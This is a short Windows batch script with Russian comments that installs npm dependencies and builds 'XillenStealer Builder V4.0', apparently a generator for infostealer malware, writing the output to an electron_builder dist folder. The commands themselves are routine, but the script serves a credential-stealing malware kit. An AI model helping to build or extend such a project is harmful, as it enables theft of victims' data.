@echo off
cd electron_builder

echo Building XillenStealer Builder V4.0...
echo.

REM Установка зависимостей
call npm install

REM Сборка
call npm run build

echo.
echo [+] Builder built successfully!
echo [+] Output: electron_builder\dist\

pause
